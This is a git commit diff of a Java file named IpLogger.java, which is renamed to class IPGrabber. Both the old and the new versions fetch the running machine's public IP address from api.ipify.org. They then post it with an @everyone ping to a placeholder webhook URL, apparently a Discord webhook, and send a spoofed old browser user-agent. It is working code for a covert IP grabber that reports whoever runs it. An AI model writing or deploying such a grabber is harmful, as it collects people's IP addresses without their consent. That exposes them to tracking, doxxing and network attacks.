0c6ef4d7a61ed4bb6a2df14bc01e7e98b0369ad6
TotoAJ <67079777+TotoAJ@users.noreply.github.com>
2021-08-15 11:38:23 -0700

    Update IpLogger.java

--- IpLogger.java
+++ IpLogger.java
@@ -1,76 +1,53 @@
-package me.totoaj;
-
-// If it doesn't work, double check your webhook URL
 
 import java.io.BufferedReader;
-import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
-import java.net.*;
-import java.nio.charset.StandardCharsets;
+import java.net.URL;
+import java.net.URLConnection;
+import java.net.URLEncoder;
 
-public class Main {
+public class IPGrabber {
 
-    static boolean pingMe = true;
-
-    private static void postMessage(String message, String url) {
-        PrintWriter out = null;
-        BufferedReader in = null;
-        StringBuilder result = new StringBuilder();
-        try {
-            URL realUrl = new URL(url);
-            URLConnection conn = realUrl.openConnection();
-            conn.setRequestProperty("accept", "*/*");
-            conn.setRequestProperty("connection", "Keep-Alive");
-            conn.setRequestProperty("user-agent", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
-            conn.setDoOutput(true);
-            conn.setDoInput(true);
-            out = new PrintWriter(conn.getOutputStream());
-            String postData = URLEncoder.encode("content", StandardCharsets.UTF_8) + "=" + URLEncoder.encode(message, StandardCharsets.UTF_8);
-            out.print(postData);
-            out.flush();
-            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            String line;
-            while ((line = in.readLine()) != null) {
-                result.append("/n").append(line);
-            }
-
-        } catch (Exception ignore) {} finally {
-            try {
-                if (out != null) {
-                    out.close();
-                }
-                if (in != null) {
-                    in.close();
-                }
-            } catch (IOException ignore) {}
+	public static void main(String[] args) {
+		try {
+            String ip = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org/").openStream())).readLine();
+            // I put it on one line because why not
+            // If you don't want it on one line the code below is how you do it.
+            /*
+            URL url = new URL("https://api.ipify.org/");
+            InputStreamReader isr = new InputStreamReader(url.openStream());
+            BufferedReader br = new BufferedReader(isr);
+            String ip = br.readLine();
+            */
+            sendMessage("@everyone\n" + "> IP: " + ip);
+        } catch(Exception e) {
+        	e.printStackTrace();
         }
-    }
+	}
+		public static void sendMessage(String message) {
+	        PrintWriter out = null;
+	        BufferedReader in = null;
+	        StringBuilder result = new StringBuilder();
+	        try {
+	            URL realUrl = new URL("<webhook url>");
+	            URLConnection conn = realUrl.openConnection();
+	            conn.setRequestProperty("accept", "*/*");
+	            conn.setRequestProperty("connection", "Keep-Alive");
+	            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
+	            conn.setDoOutput(true);
+	            conn.setDoInput(true);
+	            out = new PrintWriter(conn.getOutputStream());
+	            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
+	            out.print(postData);
+	            out.flush();
+	            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+	            String line;
+	            while ((line = in.readLine()) != null) {
+	                result.append("/n").append(line);
+	            }
 
-    private static String getIp(String url) throws IOException {
-        URL obj = new URL(url);
-        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-
-        int responseCode = conn.getResponseCode();
-        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-        String inputLine;
-        StringBuilder response = new StringBuilder();
-        if (responseCode == 200) {
-            while ((inputLine = in.readLine()) != null) {
-                response.append(inputLine);
-            }
-        } else {
-            System.out.println("Unable to get the requested data.");
-        }
-        in.close();
-        return response.toString();
-    }
-
-    public static void main(String[] args) throws Exception {
-        String ip = getIp("https://api.ipify.org/");
-        String ping;
-        if(pingMe) ping = "@everyone\n";
-        else ping = "";
-        postMessage(ping+"```IP: "+ip+"```", "<webhook url>");
-    }
+	        } catch (Exception e) {
+	            e.printStackTrace();
+	        }
+		}
 }
